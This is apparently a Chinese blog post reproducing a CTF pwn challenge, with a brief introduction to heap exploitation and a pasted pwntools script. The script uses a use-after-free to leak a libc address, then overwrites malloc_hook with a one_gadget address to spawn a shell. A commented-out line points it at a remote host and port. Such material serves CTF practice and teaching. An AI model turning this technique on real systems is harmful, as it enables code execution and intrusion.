今天复现一下pwn题的复现，pwn就是漏洞利用，找出漏洞，进行py脚本漏洞利用,达到获取权限，说着很简单，当中涉及到很多原理，有兴趣读者可以参考ctfwiki上的pwn相关知识点，里面讲的非常全，包括栈、堆等相关题目的利用，今天就简绍一下heap堆的利用，由于时间有线直接复制脚本 吧

from pwn import *

from time import sleep

s = process("./pwn")

context(arch="amd64",os="linux",log_level="debug")

#s = remote("112.126.71.170","45123")

def add():

    sleep(0.1)

    s.sendline("1")

def free(idx):

    sleep(0.1)

    s.sendline("2")

    sleep(0.1)

    s.sendline(str(idx))

def edit(idx,buf):

    sleep(0.1)

    s.sendline("3")

    sleep(0.1)

    s.sendline(str(idx))

    sleep(0.1)

    s.send(buf)

def show(idx):

    sleep(0.1)

    s.sendline("4")

    sleep(0.1)

    s.sendline(str(idx))

def glob(pattern):

    sleep(0.1)

    s.sendline("5")

    sleep(0.1)

    s.sendline(pattern)

add()#0

add()#1

free(0)

glob("/*")

show(0)

libc = s.recvuntil("\x7f")[-6:]+"\x00\x00"

libc = u64(libc)-0x3c4b78

success(hex(libc))

add()#2

malloc_hook = libc+0x3c4aed

one = libc+0xf0364

print hex(one)

free(2)

edit(2,p64(malloc_hook))

add()#3

add()#4

edit(4,'A'*19+p64(one))

free(3)
